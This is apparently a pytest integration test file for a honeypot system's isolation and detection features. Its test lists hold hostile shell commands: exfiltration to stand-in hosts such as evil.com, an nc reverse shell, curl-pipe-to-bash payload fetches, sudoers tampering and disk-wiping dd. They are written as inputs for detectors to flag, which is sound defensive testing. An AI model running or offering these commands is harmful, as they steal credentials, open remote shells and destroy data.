"""
Integration tests for security isolation and containment testing
"""

import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime

from agents.coordinator.coordinator_agent import CoordinatorAgent
from agents.interaction.interaction_agent import InteractionAgent
from security.security_manager import SecurityManager
from security.network_isolation import VPCIsolationManager, NetworkMonitor, EgressFilter
from security.data_protection import DataProtectionManager


@pytest.mark.integration
@pytest.mark.security
@pytest.mark.asyncio
class TestSecurityIsolation:
    """Test security isolation and containment mechanisms"""

    @pytest.fixture
    async def security_system(self, test_config):
        """Setup security-enabled system"""
        config = {
            **test_config,
            "security_mode": "strict",
            "isolation_level": "maximum",
            "real_data_protection": True
        }
        
        coordinator = CoordinatorAgent(config=config)
        interaction = InteractionAgent(config=config)
        security_manager = SecurityManager(config=config)
        network_isolation = VPCIsolationManager(config=config)
        data_protection = DataProtectionManager(config=config)
        
        await coordinator.start()
        await interaction.start()
        await security_manager.start()
        
        system = {
            "coordinator": coordinator,
            "interaction": interaction,
            "security_manager": security_manager,
            "network_isolation": network_isolation,
            "data_protection": data_protection,
            "active_honeypots": {}
        }
        
        yield system
        
        # Cleanup
        for hp_id in list(system["active_honeypots"].keys()):
            await coordinator.destroy_honeypot(hp_id)
        
        await coordinator.stop()
        await interaction.stop()
        await security_manager.stop()

    async def test_network_isolation_enforcement(self, security_system):
        """Test network isolation enforcement for honeypots"""
        coordinator = security_system["coordinator"]
        interaction = security_system["interaction"]
        network_isolation = security_system["network_isolation"]
        
        # Create isolated honeypot
        request = {
            "threat_data": {"source_ip": "192.168.1.100"},
            "honeypot_type": "ssh",
            "security_config": {
                "network_isolation": "strict",
                "allowed_networks": ["192.168.1.0/24"],
                "blocked_networks": ["0.0.0.0/0"],  # Block all external
                "egress_filtering": True
            }
        }
        
        honeypot = await coordinator.create_honeypot(request)
        honeypot_id = honeypot["honeypot_id"]
        security_system["active_honeypots"][honeypot_id] = honeypot
        
        session_id = f"isolation-test-{honeypot_id}"
        
        # Test internal network access (should be allowed)
        internal_commands = [
            "ping 192.168.1.1",
            "telnet 192.168.1.50 80",
            "ssh user@192.168.1.200"
        ]
        
        for command in internal_commands:
            response = await interaction.simulate_command(session_id, command)
            
            # Should simulate successful internal access
            assert "Network unreachable" not in response
            assert "Permission denied" not in response or "synthetic" in response.lower()
        
        # Test external network access (should be blocked)
        external_commands = [
            "ping 8.8.8.8",
            "curl http://google.com",
            "wget http://malicious-site.com/payload",
            "ssh attacker@external-server.com"
        ]
        
        blocked_count = 0
        for command in external_commands:
            response = await interaction.simulate_command(session_id, command)
            
            # Should be blocked or show network restrictions
            if any(indicator in response for indicator in [
                "Network unreachable", "Permission denied", "Connection refused",
                "No route to host", "Firewall blocked"
            ]):
                blocked_count += 1
        
        # Most external access should be blocked
        assert blocked_count >= len(external_commands) * 0.75
        
        # Verify isolation status
        isolation_status = await network_isolation.get_isolation_status(honeypot_id)
        assert isolation_status["status"] == "isolated"
        assert isolation_status["egress_filtering"] is True

    async def test_real_data_detection_and_protection(self, security_system):
        """Test real data detection and automatic protection"""
        interaction = security_system["interaction"]
        data_protection = security_system["data_protection"]
        
        session_id = "data-protection-test"
        
        # Initialize session with data protection
        await interaction.initialize_session(session_id, {
            "data_protection": "strict",
            "real_data_scanning": True,
            "quarantine_enabled": True
        })
        
        # Test synthetic data (should be allowed)
        synthetic_data_tests = [
            "synthetic_user_12345",
            "fake_password_abcdef",
            "test_document_synthetic.pdf",
            "192.168.1.100",  # Internal IP
            "synthetic_fingerprint_xyz789"
        ]
        
        for data in synthetic_data_tests:
            is_real = await data_protection.detect_real_data(data)
            assert is_real is False, f"Synthetic data '{data}' incorrectly flagged as real"
        
        # Test potentially real data (should be detected and blocked)
        real_data_tests = [
            "john.doe@company.com",  # Real-looking email
            "prod-server-01.company.com",  # Production hostname
            "YOUR_AWS_ACCESS_KEY_ID",  # AWS access key pattern
            "sk_live_1234567890abcdef",  # Stripe API key pattern
            "/etc/shadow",  # Sensitive system file
            "password123!@#"  # Real-looking password
        ]
        
        detected_count = 0
        for data in real_data_tests:
            is_real = await data_protection.detect_real_data(data)
            if is_real:
                detected_count += 1
                
                # Verify quarantine action
                quarantine_result = await data_protection.quarantine_data(data)
                assert quarantine_result["status"] == "quarantined"
                assert quarantine_result["reason"] == "real_data_detected"
        
        # Should detect most real data patterns
        assert detected_count >= len(real_data_tests) * 0.7

    async def test_session_isolation_boundaries(self, security_system):
        """Test session isolation boundaries and cross-session protection"""
        coordinator = security_system["coordinator"]
        interaction = security_system["interaction"]
        
        # Create honeypot
        request = {
            "threat_data": {"source_ip": "192.168.1.100"},
            "honeypot_type": "ssh",
            "isolation_config": {
                "session_isolation": "strict",
                "cross_session_access": False,
                "shared_resources": False
            }
        }
        
        honeypot = await coordinator.create_honeypot(request)
        honeypot_id = honeypot["honeypot_id"]
        security_system["active_honeypots"][honeypot_id] = honeypot
        
        # Create multiple isolated sessions
        sessions = []
        for i in range(3):
            session_data = {
                "session_id": f"isolated-session-{i}",
                "honeypot_id": honeypot_id,
                "attacker_ip": f"192.168.1.{100 + i}",
                "isolation_level": "strict"
            }
            
            await interaction.create_isolated_session(session_data)
            sessions.append(session_data["session_id"])
        
        # Test session isolation
        for i, session_id in enumerate(sessions):
            # Create session-specific data
            session_file = f"/tmp/session_{i}_data.txt"
            create_response = await interaction.simulate_command(
                session_id, f"echo 'Session {i} private data' > {session_file}"
            )
            assert "synthetic" in create_response.lower() or len(create_response) > 0
            
            # Verify file exists in this session
            read_response = await interaction.simulate_command(
                session_id, f"cat {session_file}"
            )
            assert f"Session {i}" in read_response
        
        # Test cross-session isolation
        for i, session_id in enumerate(sessions):
            # Try to access other sessions' data
            for j in range(3):
                if i != j:
                    other_file = f"/tmp/session_{j}_data.txt"
                    access_response = await interaction.simulate_command(
                        session_id, f"cat {other_file}"
                    )
                    
                    # Should not be able to access other session's data
                    assert (
                        "No such file" in access_response or
                        "Permission denied" in access_response or
                        f"Session {j}" not in access_response
                    )

    async def test_privilege_escalation_prevention(self, security_system):
        """Test prevention of privilege escalation attempts"""
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        
        session_id = "privilege-test-session"
        
        # Initialize session with limited privileges
        await interaction.initialize_session(session_id, {
            "initial_user": "limited_user",
            "privilege_level": "user",
            "escalation_monitoring": True
        })
        
        # Test privilege escalation attempts
        escalation_attempts = [
            "sudo su -",
            "su root",
            "sudo -i",
            "chmod +s /bin/bash",
            "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "/bin/su -",
            "sudo passwd root"
        ]
        
        escalation_detected = 0
        
        for attempt in escalation_attempts:
            response = await interaction.simulate_command(session_id, attempt)
            
            # Check if escalation was detected and blocked
            security_check = await security_manager.check_privilege_escalation(
                session_id, attempt, response
            )
            
            if security_check["escalation_detected"]:
                escalation_detected += 1
                
                # Verify appropriate response
                assert any(indicator in response for indicator in [
                    "Permission denied", "Authentication failure",
                    "sudo: incorrect password", "su: Authentication failure"
                ])
        
        # Should detect most escalation attempts
        assert escalation_detected >= len(escalation_attempts) * 0.6

    async def test_lateral_movement_detection(self, security_system):
        """Test detection and prevention of lateral movement attempts"""
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        
        session_id = "lateral-movement-test"
        
        await interaction.initialize_session(session_id, {
            "lateral_movement_monitoring": True,
            "network_monitoring": True
        })
        
        # Test lateral movement attempts
        lateral_attempts = [
            "ssh admin@production-server",
            "scp /etc/passwd user@database-server:/tmp/",
            "rsync -av /home/ backup-server:/backups/",
            "nc -e /bin/bash attacker-server 4444",
            "python -c 'import socket...'",  # Reverse shell attempt
            "curl http://internal-api/admin/users",
            "nmap -sS 192.168.1.0/24"
        ]
        
        lateral_detected = 0
        
        for attempt in lateral_attempts:
            response = await interaction.simulate_command(session_id, attempt)
            
            # Check for lateral movement detection
            security_check = await security_manager.detect_lateral_movement(
                session_id, attempt, response
            )
            
            if security_check["lateral_movement_detected"]:
                lateral_detected += 1
                
                # Verify blocking response
                assert any(indicator in response for indicator in [
                    "Connection refused", "Network unreachable",
                    "Permission denied", "Command not found",
                    "Firewall blocked"
                ])
        
        # Should detect most lateral movement attempts
        assert lateral_detected >= len(lateral_attempts) * 0.7

    async def test_data_exfiltration_prevention(self, security_system):
        """Test prevention of data exfiltration attempts"""
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        data_protection = security_system["data_protection"]
        
        session_id = "exfiltration-test"
        
        await interaction.initialize_session(session_id, {
            "data_loss_prevention": True,
            "exfiltration_monitoring": True,
            "network_monitoring": True
        })
        
        # Test data exfiltration attempts
        exfiltration_attempts = [
            "curl -X POST -d @/etc/passwd http://attacker-server.com/collect",
            "wget --post-file=/etc/shadow http://evil.com/upload",
            "scp /var/log/auth.log attacker@external-server:/tmp/",
            "tar czf - /home | nc attacker-ip 9999",
            "base64 /etc/passwd | curl -d @- http://exfil-server.com",
            "cat /etc/passwd | xxd | curl -X POST --data-binary @- http://bad.com"
        ]
        
        exfiltration_blocked = 0
        
        for attempt in exfiltration_attempts:
            response = await interaction.simulate_command(session_id, attempt)
            
            # Check for exfiltration detection
            security_check = await security_manager.detect_data_exfiltration(
                session_id, attempt, response
            )
            
            if security_check["exfiltration_detected"]:
                exfiltration_blocked += 1
                
                # Verify data protection
                protection_check = await data_protection.check_data_transfer(attempt)
                assert protection_check["blocked"] is True
                
                # Verify blocking response
                assert any(indicator in response for indicator in [
                    "Network unreachable", "Connection refused",
                    "Permission denied", "Transfer blocked",
                    "Data loss prevention"
                ])
        
        # Should block most exfiltration attempts
        assert exfiltration_blocked >= len(exfiltration_attempts) * 0.8

    async def test_malware_execution_prevention(self, security_system):
        """Test prevention of malware execution attempts"""
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        
        session_id = "malware-test"
        
        await interaction.initialize_session(session_id, {
            "malware_detection": True,
            "execution_monitoring": True,
            "behavioral_analysis": True
        })
        
        # Test malware-like execution attempts
        malware_attempts = [
            "wget http://malicious-site.com/payload.sh && chmod +x payload.sh && ./payload.sh",
            "curl -s http://evil.com/miner | bash",
            "python -c 'import urllib; exec(urllib.urlopen(\"http://bad.com/py\").read())'",
            "echo 'IyEvYmluL2Jhc2g=' | base64 -d | bash",  # Base64 encoded script
            "/tmp/.hidden_binary --daemon --connect-back attacker.com:4444",
            "nohup /dev/shm/cryptominer > /dev/null 2>&1 &"
        ]
        
        malware_blocked = 0
        
        for attempt in malware_attempts:
            response = await interaction.simulate_command(session_id, attempt)
            
            # Check for malware detection
            security_check = await security_manager.detect_malware_execution(
                session_id, attempt, response
            )
            
            if security_check["malware_detected"]:
                malware_blocked += 1
                
                # Verify execution was blocked
                assert any(indicator in response for indicator in [
                    "Command not found", "Permission denied",
                    "Execution blocked", "Malware detected",
                    "Security violation"
                ])
        
        # Should block most malware execution attempts
        assert malware_blocked >= len(malware_attempts) * 0.7

    async def test_emergency_containment_procedures(self, security_system):
        """Test emergency containment and incident response"""
        coordinator = security_system["coordinator"]
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        
        # Create honeypot
        request = {
            "threat_data": {"source_ip": "192.168.1.100"},
            "honeypot_type": "ssh",
            "emergency_config": {
                "auto_containment": True,
                "escalation_threshold": 3,
                "emergency_shutdown": True
            }
        }
        
        honeypot = await coordinator.create_honeypot(request)
        honeypot_id = honeypot["honeypot_id"]
        security_system["active_honeypots"][honeypot_id] = honeypot
        
        session_id = f"emergency-test-{honeypot_id}"
        
        # Simulate multiple security violations to trigger emergency response
        violations = [
            "rm -rf /etc/passwd",  # Critical file deletion
            "dd if=/dev/zero of=/dev/sda",  # Disk destruction attempt
            "iptables -F && iptables -X",  # Firewall manipulation
            "killall -9 sshd",  # Service disruption
            "chmod 777 /etc/shadow"  # Critical permission change
        ]
        
        violation_count = 0
        
        for violation in violations:
            response = await interaction.simulate_command(session_id, violation)
            
            # Report security violation
            await security_manager.report_security_violation(
                session_id, violation, "critical"
            )
            violation_count += 1
            
            # Check if emergency threshold reached
            if violation_count >= 3:
                break
        
        # Verify emergency containment was triggered
        containment_status = await security_manager.get_containment_status(session_id)
        
        assert containment_status["status"] == "contained"
        assert containment_status["trigger_reason"] == "multiple_critical_violations"
        
        # Verify emergency shutdown
        emergency_result = await coordinator.emergency_shutdown_honeypot(
            honeypot_id, "security_breach"
        )
        
        assert emergency_result["status"] == "emergency_shutdown"
        assert emergency_result["containment_applied"] is True

    async def test_audit_trail_integrity(self, security_system):
        """Test audit trail integrity and tamper detection"""
        interaction = security_system["interaction"]
        security_manager = security_system["security_manager"]
        
        session_id = "audit-integrity-test"
        
        await interaction.initialize_session(session_id, {
            "audit_logging": True,
            "integrity_checking": True,
            "tamper_detection": True
        })
        
        # Perform various actions to generate audit trail
        actions = [
            "whoami",
            "ls -la /etc",
            "cat /etc/passwd",
            "ps aux",
            "netstat -an"
        ]
        
        audit_entries = []
        
        for action in actions:
            response = await interaction.simulate_command(session_id, action)
            
            # Generate audit entry
            audit_entry = await security_manager.create_audit_entry(
                session_id, action, response
            )
            audit_entries.append(audit_entry)
        
        # Verify audit trail integrity
        integrity_check = await security_manager.verify_audit_integrity(session_id)
        
        assert integrity_check["status"] == "valid"
        assert integrity_check["entries_verified"] == len(audit_entries)
        assert integrity_check["tampering_detected"] is False
        
        # Test tamper detection by simulating audit modification
        with patch.object(security_manager, '_get_audit_hash') as mock_hash:
            mock_hash.return_value = "tampered_hash_value"
            
            tamper_check = await security_manager.verify_audit_integrity(session_id)
            
            assert tamper_check["tampering_detected"] is True
            assert tamper_check["status"] == "compromised"

    async def test_compliance_validation(self, security_system):
        """Test security compliance validation and reporting"""
        security_manager = security_system["security_manager"]
        data_protection = security_system["data_protection"]
        
        # Run comprehensive compliance check
        compliance_check = await security_manager.run_compliance_validation()
        
        # Verify required security controls
        required_controls = [
            "network_isolation",
            "data_protection", 
            "access_control",
            "audit_logging",
            "incident_response",
            "encryption",
            "authentication"
        ]
        
        for control in required_controls:
            assert control in compliance_check["controls"]
            assert compliance_check["controls"][control]["status"] == "compliant"
        
        # Verify data protection compliance
        data_compliance = await data_protection.validate_data_protection_compliance()
        
        assert data_compliance["synthetic_data_tagged"] is True
        assert data_compliance["real_data_detection_enabled"] is True
        assert data_compliance["quarantine_procedures"] is True
        assert data_compliance["encryption_enabled"] is True
        
        # Generate compliance report
        compliance_report = await security_manager.generate_compliance_report()
        
        assert compliance_report["overall_status"] == "compliant"
        assert compliance_report["compliance_score"] >= 0.95  # 95% compliance
        assert "recommendations" in compliance_report